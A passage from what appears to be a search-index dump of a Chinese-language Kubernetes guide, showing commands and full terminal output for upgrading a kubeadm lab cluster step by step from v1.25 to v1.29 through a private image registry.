\u5347\u7ea7coredns &lt;v1.26\u540e\u4f1a\u968fkubernetes\u540c\u6b65\u5347\u7ea7&gt;\n# \u6b64\u524d\u7248\u672c\u9700\u8981\u624b\u52a8\u7f16\u8f91\uff1ahub.8ops.top/google_containers/coredns:v1.8.6 --&gt; v1.9.3\nkubectl -n kube-system edit deployment.apps/coredns\n\n# \u67e5\u770b\u96c6\u7fa4\u57fa\u7840\u7ec4\u4ef6\u8fd0\u884c\nkubectl -n kube-system get all\n\n# detect etcd\netcdctl endpoint status -w table \\\n  --cluster \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#_3","title":"\u4e09\u3001\u8f93\u51fa\u8fc7\u7a0b","text":""},{"location":"kubernetes/06-cluster-upgrade-1.26/#31-v126","title":"3.1 v1.26","text":"<pre><code>root@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade plan\n[upgrade/config] Making sure the configuration is correct:\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade] Fetching available versions to upgrade to\n[upgrade/versions] Cluster version: v1.25.0\n[upgrade/versions] kubeadm version: v1.26.15\nW0920 13:51:19.925772 1997562 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable.txt\": Get \"https://cdn.dl.k8s.io/release/stable.txt\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nW0920 13:51:19.926784 1997562 version.go:105] falling back to the local client version: v1.26.15\n[upgrade/versions] Target version: v1.26.15\n[upgrade/versions] Latest version in the v1.25 series: v1.25.16\n\nW0920 13:51:22.614798 1997562 configset.go:177] error unmarshaling configuration schema.GroupVersionKind{Group:\"kubeproxy.config.k8s.io\", Version:\"v1alpha1\", Kind:\"KubeProxyConfiguration\"}: strict decoding error: unknown field \"udpIdleTimeout\"\nComponents that must be upgraded manually after you have upgraded the control plane with 'kubeadm upgrade apply':\nCOMPONENT   CURRENT        TARGET\nkubelet     5 x v1.26.15   v1.25.16\n\nUpgrade to the latest version in the v1.25 series:\n\nCOMPONENT                 CURRENT   TARGET\nkube-apiserver            v1.25.0   v1.25.16\nkube-controller-manager   v1.25.0   v1.25.16\nkube-scheduler            v1.25.0   v1.25.16\nkube-proxy                v1.25.0   v1.25.16\nCoreDNS                   v1.9.3    v1.9.3\netcd                      3.5.4-0   3.5.10-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.25.16\n\n_____________________________________________________________________\n\nUpgrade to the latest stable version:\n\nCOMPONENT                 CURRENT   TARGET\nkube-apiserver            v1.25.0   v1.26.15\nkube-controller-manager   v1.25.0   v1.26.15\nkube-scheduler            v1.25.0   v1.26.15\nkube-proxy                v1.25.0   v1.26.15\nCoreDNS                   v1.9.3    v1.9.3\netcd                      3.5.4-0   3.5.10-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.26.15\n\n_____________________________________________________________________\n\n\nThe table below shows the current state of component configs as understood by this version of kubeadm.\nConfigs that have a \"yes\" mark in the \"MANUAL UPGRADE REQUIRED\" column require manual config upgrade or\nresetting to kubeadm defaults before a successful upgrade can be performed. The version to manually\nupgrade to is denoted in the \"PREFERRED VERSION\" column.\n\nAPI GROUP                 CURRENT VERSION   PREFERRED VERSION   MANUAL UPGRADE REQUIRED\nkubeproxy.config.k8s.io   v1alpha1          v1alpha1            no\nkubelet.config.k8s.io     v1beta1           v1beta1             no\n_____________________________________________________________________\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list\nI0920 13:52:48.875674 1998736 version.go:256] remote version is much newer: v1.31.0; falling back to: stable-1.26\nW0920 13:52:52.636679 1998736 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable-1.26.txt\": Get \"https://cdn.dl.k8s.io/release/stable-1.26.txt\": dial tcp 151.101.109.55:443: connect: connection timed out\nW0920 13:52:52.636743 1998736 version.go:105] falling back to the local client version: v1.26.15\nregistry.k8s.io/kube-apiserver:v1.26.15\nregistry.k8s.io/kube-controller-manager:v1.26.15\nregistry.k8s.io/kube-scheduler:v1.26.15\nregistry.k8s.io/kube-proxy:v1.26.15\nregistry.k8s.io/pause:3.9\nregistry.k8s.io/etcd:3.5.10-0\nregistry.k8s.io/coredns/coredns:v1.9.3\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION}\nhub.8ops.top/google_containers/kube-apiserver:v1.26.0\nhub.8ops.top/google_containers/kube-controller-manager:v1.26.0\nhub.8ops.top/google_containers/kube-scheduler:v1.26.0\nhub.8ops.top/google_containers/kube-proxy:v1.26.0\nhub.8ops.top/google_containers/pause:3.9\nhub.8ops.top/google_containers/etcd:3.5.10-0\nhub.8ops.top/google_containers/coredns:v1.9.3\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION}\n[upgrade/config] Making sure the configuration is correct:\nW0920 14:02:59.601766 2006340 common.go:93] WARNING: Usage of the --config flag with kubeadm config types for reconfiguring the cluster during upgrade is not recommended!\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.26.15\"\n[upgrade/versions] Cluster version: v1.25.0\n[upgrade/versions] kubeadm version: v1.26.15\n[upgrade] Are you sure you want to proceed? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.26.15\" (timeout: 5m0s)...\n[upgrade/etcd] Upgrading to TLS for etcd\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Renewing etcd-server certificate\n[upgrade/staticpods] Renewing etcd-peer certificate\n[upgrade/staticpods] Renewing etcd-healthcheck-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/etcd.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-03-32/etcd.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=etcd\n[upgrade/staticpods] Component \"etcd\" upgraded successfully!\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests43573343\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Renewing apiserver certificate\n[upgrade/staticpods] Renewing apiserver-kubelet-client certificate\n[upgrade/staticpods] Renewing front-proxy-client certificate\n[upgrade/staticpods] Renewing apiserver-etcd-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-apiserver.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-03-32/kube-apiserver.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-apiserver\n[upgrade/staticpods] Component \"kube-apiserver\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Renewing controller-manager.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-03-32/kube-controller-manager.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-controller-manager\n[upgrade/staticpods] Component \"kube-controller-manager\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Renewing scheduler.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-scheduler.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-03-32/kube-scheduler.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-scheduler\n[upgrade/staticpods] Component \"kube-scheduler\" upgraded successfully!\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config\" in namespace kube-system with the configuration for the kubelets in the cluster\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] Configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[addons] Applied essential addon: CoreDNS\n[addons] Applied essential addon: kube-proxy\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.26.15\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#32-v127","title":"3.2 v1.27","text":"<pre><code>root@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade plan | tee kubeadm-init.yaml-${KUBE_VERSION}-default\n[upgrade/config] Making sure the configuration is correct:\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade] Fetching available versions to upgrade to\n[upgrade/versions] Cluster version: v1.26.15\n[upgrade/versions] kubeadm version: v1.27.16\nW0920 14:35:58.460906 2035688 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable.txt\": Get \"https://cdn.dl.k8s.io/release/stable.txt\": dial tcp 151.101.77.55:443: connect: connection timed out\nW0920 14:35:58.461096 2035688 version.go:105] falling back to the local client version: v1.27.16\n[upgrade/versions] Target version: v1.27.16\nW0920 14:36:03.708888 2035688 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable-1.26.txt\": Get \"https://cdn.dl.k8s.io/release/stable-1.26.txt\": dial tcp 151.101.77.55:443: connect: connection timed out\nW0920 14:36:03.708978 2035688 version.go:105] falling back to the local client version: v1.27.16\n[upgrade/versions] Latest version in the v1.26 series: v1.27.16\n\nComponents that must be upgraded manually after you have upgraded the control plane with 'kubeadm upgrade apply':\nCOMPONENT   CURRENT        TARGET\nkubelet     5 x v1.26.15   v1.27.16\n\nUpgrade to the latest version in the v1.26 series:\n\nCOMPONENT                 CURRENT    TARGET\nkube-apiserver            v1.26.15   v1.27.16\nkube-controller-manager   v1.26.15   v1.27.16\nkube-scheduler            v1.26.15   v1.27.16\nkube-proxy                v1.26.15   v1.27.16\nCoreDNS                   v1.9.3     v1.10.1\netcd                      3.5.10-0   3.5.12-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.27.16\n\n_____________________________________________________________________\n\n\nThe table below shows the current state of component configs as understood by this version of kubeadm.\nConfigs that have a \"yes\" mark in the \"MANUAL UPGRADE REQUIRED\" column require manual config upgrade or\nresetting to kubeadm defaults before a successful upgrade can be performed. The version to manually\nupgrade to is denoted in the \"PREFERRED VERSION\" column.\n\nAPI GROUP                 CURRENT VERSION   PREFERRED VERSION   MANUAL UPGRADE REQUIRED\nkubeproxy.config.k8s.io   v1alpha1          v1alpha1            no\nkubelet.config.k8s.io     v1beta1           v1beta1             no\n_____________________________________________________________________\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list\nW0920 14:41:28.924764 2039862 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable-1.txt\": Get \"https://cdn.dl.k8s.io/release/stable-1.txt\": dial tcp 151.101.77.55:443: connect: connection timed out\nW0920 14:41:28.924930 2039862 version.go:105] falling back to the local client version: v1.27.16\nregistry.k8s.io/kube-apiserver:v1.27.16\nregistry.k8s.io/kube-controller-manager:v1.27.16\nregistry.k8s.io/kube-scheduler:v1.27.16\nregistry.k8s.io/kube-proxy:v1.27.16\nregistry.k8s.io/pause:3.9\nregistry.k8s.io/etcd:3.5.12-0\nregistry.k8s.io/coredns/coredns:v1.10.1\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION}\nhub.8ops.top/google_containers/kube-apiserver:v1.27.16\nhub.8ops.top/google_containers/kube-controller-manager:v1.27.16\nhub.8ops.top/google_containers/kube-scheduler:v1.27.16\nhub.8ops.top/google_containers/kube-proxy:v1.27.16\nhub.8ops.top/google_containers/pause:3.9\nhub.8ops.top/google_containers/etcd:3.5.12-0\nhub.8ops.top/google_containers/coredns:v1.10.1\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION}\n[upgrade/config] Making sure the configuration is correct:\nW0920 14:47:47.420789 2044537 common.go:93] WARNING: Usage of the --config flag with kubeadm config types for reconfiguring the cluster during upgrade is not recommended!\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.27.16\"\n[upgrade/versions] Cluster version: v1.26.15\n[upgrade/versions] kubeadm version: v1.27.16\n[upgrade] Are you sure you want to proceed? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.27.16\" (timeout: 5m0s)...\n[upgrade/etcd] Upgrading to TLS for etcd\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Renewing etcd-server certificate\n[upgrade/staticpods] Renewing etcd-peer certificate\n[upgrade/staticpods] Renewing etcd-healthcheck-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/etcd.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-48-11/etcd.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=etcd\n[upgrade/staticpods] Component \"etcd\" upgraded successfully!\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests186193418\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Renewing apiserver certificate\n[upgrade/staticpods] Renewing apiserver-kubelet-client certificate\n[upgrade/staticpods] Renewing front-proxy-client certificate\n[upgrade/staticpods] Renewing apiserver-etcd-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-apiserver.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-48-11/kube-apiserver.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-apiserver\n[upgrade/staticpods] Component \"kube-apiserver\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Renewing controller-manager.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-48-11/kube-controller-manager.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-controller-manager\n[upgrade/staticpods] Component \"kube-controller-manager\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Renewing scheduler.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-scheduler.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-14-48-11/kube-scheduler.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-scheduler\n[upgrade/staticpods] Component \"kube-scheduler\" upgraded successfully!\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config\" in namespace kube-system with the configuration for the kubelets in the cluster\n[upgrade] Backing up kubelet config file to /etc/kubernetes/tmp/kubeadm-kubelet-config555192007/config.yaml\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] Configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[addons] Applied essential addon: CoreDNS\n[addons] Applied essential addon: kube-proxy\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.27.16\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#33-v128","title":"3.3 v1.28","text":"<pre><code>root@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list\nI0920 16:52:09.054877 2142217 version.go:256] remote version is much newer: v1.31.0; falling back to: stable-1.28\nW0920 16:52:19.059045 2142217 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable-1.28.txt\": Get \"https://cdn.dl.k8s.io/release/stable-1.28.txt\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nW0920 16:52:19.059128 2142217 version.go:105] falling back to the local client version: v1.28.14\nregistry.k8s.io/kube-apiserver:v1.28.14\nregistry.k8s.io/kube-controller-manager:v1.28.14\nregistry.k8s.io/kube-scheduler:v1.28.14\nregistry.k8s.io/kube-proxy:v1.28.14\nregistry.k8s.io/pause:3.9\nregistry.k8s.io/etcd:3.5.15-0\nregistry.k8s.io/coredns/coredns:v1.10.1\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION}\nhub.8ops.top/google_containers/kube-apiserver:v1.27.16\nhub.8ops.top/google_containers/kube-controller-manager:v1.27.16\nhub.8ops.top/google_containers/kube-scheduler:v1.27.16\nhub.8ops.top/google_containers/kube-proxy:v1.27.16\nhub.8ops.top/google_containers/pause:3.9\nhub.8ops.top/google_containers/etcd:3.5.15-0\nhub.8ops.top/google_containers/coredns:v1.10.1\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION}\n[upgrade/config] Making sure the configuration is correct:\nW0920 17:03:46.551837 2153542 common.go:94] WARNING: Usage of the --config flag with kubeadm config types for reconfiguring the cluster during upgrade is not recommended!\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.28.14\"\n[upgrade/versions] Cluster version: v1.27.16\n[upgrade/versions] kubeadm version: v1.28.14\n[upgrade] Are you sure you want to proceed? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.28.14\" (timeout: 5m0s)...\n[upgrade/etcd] Upgrading to TLS for etcd\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests946810205\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Renewing apiserver certificate\n[upgrade/staticpods] Renewing apiserver-kubelet-client certificate\n[upgrade/staticpods] Renewing front-proxy-client certificate\n[upgrade/staticpods] Renewing apiserver-etcd-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-apiserver.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-17-04-37/kube-apiserver.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-apiserver\n[upgrade/staticpods] Component \"kube-apiserver\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Renewing controller-manager.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-17-04-37/kube-controller-manager.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-controller-manager\n[upgrade/staticpods] Component \"kube-controller-manager\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Renewing scheduler.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-scheduler.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-17-04-37/kube-scheduler.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-scheduler\n[upgrade/staticpods] Component \"kube-scheduler\" upgraded successfully!\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config\" in namespace kube-system with the configuration for the kubelets in the cluster\n[upgrade] Backing up kubelet config file to /etc/kubernetes/tmp/kubeadm-kubelet-config3476418119/config.yaml\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] Configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[upgrade/addons] skip upgrade addons because control plane instances [k-kube-lab-02 k-kube-lab-03] have not been upgraded\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.28.14\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#34-v129","title":"3.4 v1.29","text":"<pre><code>root@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list\nW0920 17:36:05.493241 2182958 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable-1.txt\": Get \"https://dl.k8s.io/release/stable-1.txt\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nW0920 17:36:05.493409 2182958 version.go:105] falling back to the local client version: v1.29.9\nregistry.k8s.io/kube-apiserver:v1.29.9\nregistry.k8s.io/kube-controller-manager:v1.29.9\nregistry.k8s.io/kube-scheduler:v1.29.9\nregistry.k8s.io/kube-proxy:v1.29.9\nregistry.k8s.io/coredns/coredns:v1.11.1\nregistry.k8s.io/pause:3.9\nregistry.k8s.io/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION}\nhub.8ops.top/google_containers/kube-apiserver:v1.29.9\nhub.8ops.top/google_containers/kube-controller-manager:v1.29.9\nhub.8ops.top/google_containers/kube-scheduler:v1.29.9\nhub.8ops.top/google_containers/kube-proxy:v1.29.9\nhub.8ops.top/google_containers/coredns:v1.11.1\nhub.8ops.top/google_containers/pause:3.9\nhub.8ops.top/google_containers/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images pull --config kubeadm-init.yaml-${KUBE_VERSION}\n[config/images] Pulled hub.8ops.top/google_containers/kube-apiserver:v1.29.9\n[config/images] Pulled hub.8ops.top/google_containers/kube-controller-manager:v1.29.9\n[config/images] Pulled hub.8ops.top/google_containers/kube-scheduler:v1.29.9\n[config/images] Pulled hub.8ops.top/google_containers/kube-proxy:v1.29.9\n[config/images] Pulled hub.8ops.top/google_containers/coredns:v1.11.1\n[config/images] Pulled hub.8ops.top/google_containers/pause:3.9\n[config/images] Pulled hub.8ops.top/google_containers/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION}\n[upgrade/config] Making sure the configuration is correct:\nW0920 17:41:12.008711 2187038 common.go:94] WARNING: Usage of the --config flag with kubeadm config types for reconfiguring the cluster during upgrade is not recommended!\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.29.9\"\n[upgrade/versions] Cluster version: v1.28.14\n[upgrade/versions] kubeadm version: v1.29.9\n[upgrade] Are you sure you want to proceed? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.29.9\" (timeout: 5m0s)...\n[upgrade/etcd] Upgrading to TLS for etcd\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests1373743205\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Renewing apiserver certificate\n[upgrade/staticpods] Renewing apiserver-kubelet-client certificate\n[upgrade/staticpods] Renewing front-proxy-client certificate\n[upgrade/staticpods] Renewing apiserver-etcd-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-apiserver.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-17-42-44/kube-apiserver.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-apiserver\n[upgrade/staticpods] Component \"kube-apiserver\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Renewing controller-manager.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-17-42-44/kube-controller-manager.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-controller-manager\n[upgrade/staticpods] Component \"kube-controller-manager\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Renewing scheduler.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-scheduler.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-20-17-42-44/kube-scheduler.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)\n[apiclient] Found 3 Pods for label selector component=kube-scheduler\n[upgrade/staticpods] Component \"kube-scheduler\" upgraded successfully!\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" 